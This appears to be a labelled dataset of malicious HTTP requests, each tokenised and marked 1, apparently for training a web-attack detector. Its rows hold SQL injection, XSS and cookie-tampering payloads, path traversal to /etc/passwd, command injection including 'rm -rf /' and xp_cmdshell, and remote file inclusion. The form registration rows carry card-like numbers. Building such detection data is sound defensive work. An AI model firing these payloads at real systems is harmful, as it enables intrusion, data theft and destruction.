request	label
/  .  /  \  /  .  /  .  /  \  /  .  /  .  /  \  /  .  /  .  /  \  /  .  /  .  /  \  /  .  /  .  /  \  /  .  /  .  /  \  /  .  /  .  /  \  /  .  /  { file } 	1
/ cgi-bin / mail . php ? id =  '  /  *  *  / union /  *  *  / select /  *  *  / 1 , 2 , 1331919012 , 4 --  & blog = 1 	1
/ string / strings / parameters = '  ;  str =  $  ( echo ezcoie )  ;  str1 =  $  {  # str }  ;  if  [  9 -ne  $  { str1 }   ]  ;  then sleep 0 ;  else sleep 1 ;  fi  ' 	1
"/ string / strings / parameters = < img id = xss src =  ""  "" mocha :  [ code ]  ""  ""  > "	1
/ string / strings / parameters = |   [  8 -ne  $  ( echo mmqksr  |  tr -d  '  \ n '   |  wc -c )   ]   |  |  sleep 1  & 	1
/ scripts / index . php ? op = viewarticle & articleid = 9999 /  *  *  / union /  *  *  / select /  *  *  / 1331904442 , 1 , 1 , 1 , 1 , 1 , 1 , 1 --  & blogid = 1 	1
/ string / strings / parameters = |  | echo $ ifswfkqve $  (  ( 90 + 1 )  )  $  ( echo $ ifswfkqve ) wfkqve /  / 	1
/ ap58k3ci . jspa ?  < script > cross_site_scripting . nasl <  / script > 	1
"/ string / strings / parameters = -9057 ""  ""  )  or 1 group by concat ( 0x7171706a71 ,  ( select  ( case when  ( 4232 = 4232 )  then 1 else 0 end )  )  , 0x717a767a71 , floor ( rand ( 0 )  * 2 )  )  having min ( 0 )  # "	1
"/ string / strings / parameters = ""  ;  str =  $  ( echo bumbbo )  ;  str1 =  $  {  # str }  ;  if  [  1 -ne  $  { str1 }   ]  ;  then sleep 0 ;  else sleep 1 ;  fi  \  \ "	1
/ string / modo = registro & login = mobasher & password = pa32885o & nombre = noel + stefani & apellidos = dolce + mull-uhuar__a & email = deschamps1 @ 11horas . my & dni = 51756068l & direccion = calle + jerusalen + 18 +  & ciudad = santibez + de + valcorba & cp = 39776 & provincia = almera & ntc = 9542215186041042 & b1 = registrar 	1
/ examples / jsp / num / wiki . php /  < script > foo <  / script > 	1
/ zuihld5m . exe ?  < script > cross_site_scripting . nasl <  / script > 	1
"/ iktok2bw . jspa ?  < img src =  "" javascript : alert ( cross_site_scripting . nasl )  ;  ""  > "	1
/ string / modo = registro & login = beatriz & password = m9n87d90 & nombre = c ? asio & apellidos = arlat + poma & email = pezzotta-castella @ artesania . org . nc & dni = 35265294s & direccion = calle + kadiga + 91 +  & ciudad = bobadilla & cp = 31750 & provincia = barcelona & ntc = 4154281799426251 & b1 = registrar 	1
/ phpmyadmin / bb-hostsvc . sh ? hostsvc =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd 	1
"/ qczkquis . exe ?  < script > document . cookie =  "" testkwlg = 5591 ;  ""  <  / script > "	1
/ string / str =  $  ( echo nwelwc )   str1 =  $  {  # str }   if  [  9 -ne  $  { str1 }   ]   then sleep 0  else sleep 1  fi 	1
/ string / id = 2 /  & nombre = queso + manchego & precio = 85 & cantidad = 12 & b1 = aadir + al + carrito 	1
/ string / strings / parameters = |   [  6 -ne  $  ( echo jnnrop  |  tr -d  '  \ n '   |  wc -c )   ]   |  |  sleep 1  /  / 	1
"/ string / id = 1 & nombre =  <  !  --  # exec + cmd =  "" rm + -rf +  /  ; cat +  / etc / passwd ""  +  --  >  & precio = 85 & cantidad = 15 & b1 = aadir + al + carrito "	1
/ string / modo = insertar & precio = 6226 & b1 = confirmar ? 	1
/ string / strings / parameters = 1 '  +  ( select  ' unpz '  where 8186 = 8186 ; select  ( case when  ( 2593 = 3592 )  then 2593 else 2593 *  ( select 2593 from information_schema . character_sets )  end )  # 	1
/ string / strings / parameters = 1 '  )  as ccee where 8880 = 8880 and 8514 =  ( select count (  *  )  from domain . domains as t1 , domain . columns as t2 , domain . tables as t3 )  -- 	1
"/ string / strings / parameters = -1 < layer src =  ""  "" javascript : document . cookie = true ;  ""  ""  >  <  / layer > "	1
"/ string / strings / parameters = ""  | echo $ ifszohikn $  (  ( 60 + 22 )  )  $  ( echo $ ifszohikn ) zohikn \  \ "	1
"/ main . php ? logout =  ""  & rm ; q41289753 & rem ; "	1
/ javascript /  . htaccess . sfish /  /  / skipfish . invalid /  ;  ? 	1
/ j734qobz . cfm ?  < script > cross_site_scripting . nasl <  / script > 	1
"/ help . php ? q =  ""  | ping -w 10000 -n 1 1 . 2 . 3 . 4 | rem "	1
/ string / strings / parameters = '   str =  $  ( echo wudxts )   str1 =  $  {  # str }   if  [  7 -ne  $  { str1 }   ]   then sleep 0  else sleep 1  fi  & 	1
/ string / strings / parameters = -7779 '  )  where 4976 = 4976 or 6872 = 6872 -- 	1
"/ string / strings / parameters = ""  )  , null , null , null )  waitfor delay  ' 0 : 0 : 20 '   /  * "	1
/ cacti / webspirs . cgi ? sp . nextform =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd 	1
"/ string / strings / parameters = < script > eval (  ""  \ x61 \ x6c \ x65 \ x72 \ x74 ( 1 )  ""  )  ;  <  / script >   /  /  hexadecimal escapes using eval "	1
/ en-us / account / includes / config . php ? relative_script_path = http :  /  / xxxxxxx 	1
"/ j4oqyvga . jspa ?  < img src =  "" javascript : alert ( cross_site_scripting . nasl )  ;  ""  > "	1
/ string / modo = entrar & login = crigger & pwd = acribadora & remember =  '  ,  ' 0 '  ,  ' 0 '  )  ; waitfor + delay +  ' 0 : 0 : 15 '  ;  --  & b1 = entrar 	1
"/ string / strings / parameters = <  /  foo =  ""  >  < script > alert ( 1 )  <  / script >  ""  > "	1
/ main . php ? stuff =  '  \ x0drm q64854395  # 	1
/ javascript / viewforum . exe 	1
/ string / modo = registro & login = daesik2 & password = 2458ca1e581 & nombre = panciano & apellidos = masc + pr *  . ado & email = dorsay . thursby @ elrincondelmarmol . pr & dni = 51834543h & direccion = cabo + de + agua ,  + s / n +  & ciudad = villafranca + de + los + barros & cp = 21240 & provincia = jan & ntc = 8319637256237029 & b1 = registrar 	1
"/ string / strings / parameters = ""  ;  str =  $  ( echo gjnrxw )  ;  str1 =  $  {  # str }  ;  if  [  2 -ne  $  { str1 }   ]  ;  then sleep 0 ;  else sleep 1 ;  fi  "" "	1
/ eei78ore . jsp ?  < script > cross_site_scripting . nasl <  / script > 	1
/ string / modo = registro & login = jozef & password = ve9derse & nombre = tahiel & apellidos = gua + sp +  + kiu + han & email = lemontier @ viajesnacionales . kp & dni = 70721027y & direccion = calle + virgen + de + la + hoz ,  + 123 + 4-b & ciudad = borrass & cp = 44564 & provincia = zaragoza & ntc = 7002955624204925 & b1 = registrar 	1
"/ string / strings / parameters = '  &  sleep 0  &  &  str =  $  ( echo xgxykb )   &  &  str1 =  $  {  # str }   &  &   [  1 -eq  $  { str1 }   ]   &  &  sleep 1  "" "	1
"/ fa8p8lr8 . pl ?  < img src =  "" javascript : alert ( cross_site_scripting . nasl )  ;  ""  > "	1
/ string / strings / parameters = )  ;  } print (  ` echo swqeio \ necho  $  (  ( 64 + 42 )  )  \ necho swqeio \ necho swqeio `  )  ;  \  \ swqeio 	1
"/ string / strings / parameters = 1 ""  ""  )  )  as hace where 8785 = 8785 ; begin user_lock . sleep ( 5 )  ;  end -- "	1
/ string / errormsg =  @ 40 	1
/ inc / exif . inc . php ? exif_prog =  ( echo -n  ' original_exif_prog_cmd_exec . nasl :   '  ; id )  |  | echo 	1
/ scripts / new_images . php ? order = linpha_order_sql_injection . nasl_1331904398 	1
/ string / strings / parameters = '  |   [  7 -ne  $  ( echo xocduh  |  tr -d  '  \ n '   |  wc -c )   ]   |  |  sleep 1  \  \ 	1
/ string / strings / parameters = |   [  5 -ne  $  ( echo nmwjxy  |  tr -d  '  \ n '   |  wc -c )   ]   |  |  sleep 1  /  / 	1
/ recordings / sgdynamo . exe ? htname =  < script > foo <  / script > 	1
/ top . php ? stuff =  & ping ; -w ; 9000 ; -n ; 1 ; 1 . 2 . 3 . 4 & rem ; 	1
/ en-us / account / help / index . php ? help_file =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd 	1
"/ en-us / fo564rei . nsf ?  < img src =  "" javascript : alert ( cross_site_scripting . nasl )  ;  ""  > "	1
/ string / modo = registro & login = adornato & password = politiquera & nombre = fedelia & apellidos = 	1
/ evb / check_url . php ? url = pligg_url_sql_injection . nasl '  union select 1331904454 , 1014388214  -- 	1
/ string / strings / parameters = 1 '  )  ; begin user_lock . sleep ( 5 )  ;  end -- 	1
/ theme / test2 . php ? root = xxpathxx 	1
/ cgi-bin / simple / view_page ? mv_arg =  | cat  / etc / passwd | 	1
"/ scs86g1p . nsf ?  < script > document . cookie =  "" testquyx = 2820 ;  ""  <  / script > "	1
/ string / strings / parameters = & echo rdicix $  (  ( 99 + 44 )  )  $  ( echo rdicix ) rdicix & 	1
"/ jackrabbit / search . jsp ? q =  %  ""  < script > alert ( 1331909171 )  <  / script > "	1
/ string / str =  $  ( echo ixzjdx )   str1 =  $  {  # str }   if  [  5 -ne  $  { str1 }   ]   then sleep 0  else sleep 1  fi  \  \ 	1
/ string / strings / parameters = 1 %  '  union all select null , null , null , null , null , null , null , null , null , null -- 	1
/ examples / jsp / cal / ustorekeeper . pl ? command = goto & file =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd 	1
/ string / strings / parameters = -1 < style >  @ im \  \ port '  \  \ ja asc ipt : document . cookie = true '  ;  <  / style > 	1
"/ d44uk9h2 . cfc ?  < script > document . cookie =  "" testmybc = 2088 ;  ""  <  / script > "	1
/ string / strings / parameters = 1 '  )  )  )  ; waitfor delay  ' 0 : 0 : 5 '  and  (  (  (  ' ywnm '  =  ' ywnm 	1
/ string / modo = insertar & precio = 7767 & b1 = confirmar / 	1
/ javascript / framework . exe 	1
/ examples / jsp / jsp2 / jspx / modules . php ? mod = fm & file =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd \ x00 & bn = fm_d1 	1
/ string / strings / parameters = -1587 '  )  or 8339 = 5540 	1
"/ 5qnlm5z2 . php3 ?  < meta http-equiv = set-cookie content =  "" testsixi = 8451 ""  > "	1
/ string / id = 2 /  & nombre = vino + rioja & precio = 39 & cantidad = 58 & b1 = aadir + al + carrito 	1
/ core / admin / upload . php ? p = admin & do = upload & c = ok & absoluteurlxxpathxx 	1
/ string / modo = registro & login = charko & password = entrevenimiento & nombrea = cayetano & apellidos = papiol + garriga & email = ruehmann . goodrow @ cajucar . bz & dni = 75246757a & direccion = c /  + sierra + maigmo ,  + s / n ,  + 1 ? d & ciudad = villa + de + ves & cp = 09343 & provincia = guadalajara & ntc = 1828745224462815 & b1 = registrar 	1
"/ string / strings / parameters = < script > document . cookie =  "" testwldz = 3506 ;  ""  <  / script > "	1
/ jamie ' s return to school dinners / 	1
"/ string / strings / parameters = ""  &  sleep 0  &  &  str =  $  ( echo icrcgr )   &  &  str1 =  $  {  # str }   &  &   [  7 -eq  $  { str1 }   ]   &  &  sleep 1  "" "	1
/ string / modo = registro & login = jowett & password = 2082es & nombre = malco & apellidos = fresquet + giuggia & email = moriaty . suchima @ vendomiatico . at & dni = 34012270p & direccion = c /  + codigo + apartados + particulares + oficiales + y + lista + 94 ,  + 3 ? e & ciudad = vall + de *  .  + cards & cp = 09613 & provincia = salamanca & ntc = 1543672181801522 & b1 = registrar 	1
/ confirmunsubscription . php ? output = http :  /  / 192 . 168 . 202 . 96 : 8080 / no4ghqiguzhst ? 	1
/ string / modo = insertar & precio = 7896 & b1 = confirmar / 	1
"/ string / strings / parameters = ;  /  *  , 1 *  /  exec  /  *  , 1 *  /  master .  . xp_cmdshell  /  *  , 1 *  /   "" ping 127 . 0 . 0 . 1 ""   /  *  , 1 *  /  -- "	1
/ admin / configset . php ? settings_dir =  / etc / passwd \ x00 	1
"/ string / strings / parameters = -1 < xml src =  ""  "" javascript : document . cookie = true ;  ""  ""  > "	1
"/ string / strings / parameters = ""  < script > confirm ( 0 )  ;  <  / script >  "" "	1
/ string / strings / parameters = a )  ;  / usr / bin / id | 	1
"/ string / id = 3 & nombre = jamn + ibricoparos ""  + style =  "" background : url ( javascript : alert (  ' paros '  )  )  & id = 2 & precio = 39 & cantidad = 4 & b1 = aadir + al + carrito "	1
/ phpmyadmin / admin / index . php ? act = login & username =  '  union select 1 ,  ' pafaq_10b4 . nasl '  ,  ' 5e0bd03bec244039678f2b955a2595aa '  ,  '  '  , 0 ,  '  '  ,  '  '  --  & password = nessus 	1
/ administrator / components / com_jcs / view / register . php ? mosconfig_absolute_path = xxpathxx 	1
"/ uvazfs7p . nsf ?  < meta http-equiv = set-cookie content =  "" testwtbo = 4831 ""  > "	1
"/ scripts / login . php ? user =  ""  >  < script > alert (  ' pubcookie_xss . nasl '  )  ;  <  / script > "	1
/ string / strings / parameters = 1 '  +  ( select kqac where 4362 = 4362 and 8312 = dbms_pipe . receive_message ( chr ( 69 )  |  | chr ( 79 )  |  | chr ( 101 )  |  | chr ( 68 )  , 5 )  -- 	1
"/ 0qhcnefz . mscgi ?  < img src =  "" javascript : alert ( cross_site_scripting . nasl )  ;  ""  > "	1
/ xoops232b / htdocs / xoops_lib / modules / protector / onupdate . php ? mydirname = a (  )  {  } system (  '  /  .  / tmp / qgtapzqwsv0 +  >  +  / dev / null +  &  '  )  ;  function v 	1
"/ string / strings / parameters = ""  . print (  ` echo zlvkdu `  .  ` echo  $  (  ( 0 + 22 )  )  `  .  ` echo zlvkdu `  .  ` echo zlvkdu `  )  )  } zlvkdu "	1
"/ string / strings / parameters = ""  ; echo $ ifshzzdke $  (  ( 23 + 65 )  )  $  ( echo $ ifshzzdke ) hzzdke & "	1
/ string / id = 3 & nombre = queso + manchego & precio = 39 & cantidad = 5 & b1 = aadir + al + carritoany ?   set-cookie :  + tamper = 1041264011025374727 	1
/ string / strings / parameters = 1 '  )  rlike  ( select  *  from  ( select ( sleep ( 5 )  )  ) sgvo )  and  (  ' zqiw '  =  ' zqiw 	1
"/ string / strings / parameters = < base href =  "" javascript : alert (  ' xss '  )  ;  /  /  ""  > "	1
/ sources / post . php ? fil_config = xxpathxx 	1
/ string / strings / parameters = 1 )  where 7600 = 7600 union all select null , null , null , null , null , null -- 	1
/ javascript / post . exe 	1
/ examples / jsp / error / index . php ? gadget = glossary & action = viewterm & term =  < script > alert (  ' jaws_xss . nasl '  )  ;  <  / script > 	1
/ wapchat / src / eng . savenewroom . php ? sysfiledir = xxpathxx 	1
"/ string / strings / parameters = 1 ""  ""  where 1386 = 1386 ; select  ( case when  ( 3435 = 4011 )  then 1 else 3435 *  ( select 3435 from master .  . sysdatabases )  end )  -- "	1
"/ string / strings / parameters = | echo wefnxm $  (  ( 36 + 97 )  )  $  ( echo wefnxm ) wefnxm "" "	1
/ examples / jsp / cal / kernel / loadkernel . php ? installpath =  / etc / passwd \ x00 	1
/ static /  /  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  . etc / passwd 	1
"/ string / strings / parameters = -2246 ""  ""  )  )  union all select 4613 , 4613 , 4613 , 4613 , 4613 , 4613 # "	1
"/ en-us / i686v90l . cfc ?  < script > document . cookie =  "" testfutf = 1550 ;  ""  <  / script > "	1
"/ string / strings / parameters = '  |   [  4 -ne  $  ( echo jvvwqm  |  tr -d  '  \ n '   |  wc -c )   ]   |  |  sleep 1  "" "	1
/ string / strings / parameters = 1 rlike  ( select  ( case when  ( 7689 = 7689 )  then 1 else 0x28 end )  )  #  mekk 	1
/ string / strings / parameters = '  ;  str =  $  ( echo asbpas )  ;  str1 =  $  {  # str }  ;  if  [  5 -ne  $  { str1 }   ]  ;  then sleep 0 ;  else sleep 1 ;  fi  | 	1
"/ string / strings / parameters = '  &  sleep 0  &  &  str =  $  ( echo erqgrv )   &  &  str1 =  $  {  # str }   &  &   [  4 -eq  $  { str1 }   ]   &  &  sleep 1  "" "	1
/ string / strings / parameters = echo jlciie $  (  ( 76 + 4 )  )  $  ( echo jlciie ) jlciie ' 	1
"/ ao22ww7y . x ?  < script > document . cookie =  "" testqppc = 8767 ;  ""  <  / script > "	1
"/ string / strings / parameters = 1 %  ""  ""  )  )  and  ( select 9067 from ( select count (  *  )  , concat ( 0x7171706a71 ,  ( select  ( elt ( 9067 = 9067 , 1 )  )  )  , 0x717a767a71 , floor ( rand ( 0 )  * 2 )  ) x from information_schema . character_sets group by x ) a )  and  (  (  ""  ""  %  ""  ""  =  ""  "" "	1
/ examples / jsp / checkbox / mailbox . php3 ? actionid = 6 & server = x & imapuser = x '  ; somesql & pass = x 	1
"/ string / strings / parameters = -3828 %  ""  ""  )  )  )  or make_set ( 1765 = 8657 , 8657 )  and  (  (  (  ""  ""  %  ""  ""  =  ""  "" "	1
/ string / strings / parameters = 1 '  and 8635 =  ( select count (  *  )  from generate_series ( 1 , 5000000 )  )  -- 	1
/ string / str =  $  ( echo ihgkbj )   str1 =  $  {  # str }   if  [  7 -ne  $  { str1 }   ]   then sleep 0  else sleep 1  fi  \  \ 	1
"/ en-us / w4996nr0 . jsp ?  < meta http-equiv = set-cookie content =  "" testttvs = 7163 ""  > "	1
/ string / strings / parameters = -6912 '  in boolean mode )  union all select 6012 -- 	1
/ string / strings / parameters = ; echo pdwibs $  (  ( 76 + 7 )  )  $  ( echo pdwibs ) pdwibs ' 	1
/ podcastgen1 . 0beta2 / core / admin / admin . php ? p = admin & absoluteurl = xxpathxx 	1
/ help . php ? q =  \ x0duname \ x09 > q97517558 \ x09 # 	1
/ string / modoa = registro & login = keene-mo & password = des2l0bear & nombre = florio & apellidos = alcalde + rybensky & email = bobenko-steimaroua @ 926 . lb & dni = 65834957x & direccion = c /  + leganes ,  + 74 +  & ciudad = sant + miquel + de + campmajor & cp = 42138 & provincia = huesca & ntc = 7967092459392219 & b1 = registrar 	1
/ string / strings / parameters = 1 '  |  |  ( select  ' kzkr '  from dual where 2778 = 2778 ; select count (  *  )  from domain . domains as t1 , domain . columns as t2 , domain . tables as t3 )  |  |  ' 	1
/ string / strings / parameters = ;  str =  $  ( echo ojgbkf )  ;  str1 =  $  {  # str }  ;  if  [  7 -ne  $  { str1 }   ]  ;  then sleep 0 ;  else sleep 1 ;  fi  & 	1
/ scripts / index . php ? go = detail & id = -99999 /  *  *  / union /  *  *  / select /  *  *  / 0 , 1 , concat ( 1331908854 , 0x3a , 1781864537 )  , 3 , 4 , 5 , 6 , 7 , 8 , 9 , 10 , 11 , 12 , 13 , 14 , 15 , 16 	1
"/ i7prbs22 . php ?  < meta http-equiv = set-cookie content =  "" testjnre = 7328 ""  > "	1
"/ main . php ? stuff =  "" del q53176124 & rem "	1
/ string / strings / parameters = &  sleep 0  &  &  str =  $  ( echo qeluff )   &  &  str1 =  $  {  # str }   &  &   [  8 -eq  $  { str1 }   ]   &  &  sleep 1  /  / 	1
/ examples / jsp / error / webadmin . php ? show =  / etc / passwd 	1
"/ string / strings / parameters = ""  ;  str =  $  ( echo pracfz )  ;  str1 =  $  {  # str }  ;  if  [  5 -ne  $  { str1 }   ]  ;  then sleep 0 ;  else sleep 1 ;  fi  ' "	1
/ string / strings / parameters = -7069 )  union all select 6638 , 6638 , 6638 , 6638 , 6638 , 6638 -- 	1
/ string / id = 1 & nombre = queso + manchego & precio = 39 /  & cantidad = 30 & b1 = aadir + al + carrito 	1
/ index . php ? classified_path = xxpathxx ? 	1
/ string / strings / parameters = 1 '  )  )  and 6510 =  ( select count (  *  )  from sysusers as sys1 , sysusers as sys2 , sysusers as sys3 , sysusers as sys4 , sysusers as sys5 , sysusers as sys6 , sysusers as sys7 )  and  (  (  ' uadr '  like  ' uadr 	1
"/ string / strings / parameters = 1 %  ""  ""  )  and 2006 = 2006 "	1
/ string / strings / parameters = &  & echo kjzrgw $  (  ( 6 + 53 )  )  $  ( echo kjzrgw ) kjzrgw ' 	1
/ string / strings / parameters = 1 '  )  )  and 7533 = 7533 and  (  (  ' ialm '  =  ' ialm 	1
/ en-us / account / pfdispaly . cgi ?  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd 	1
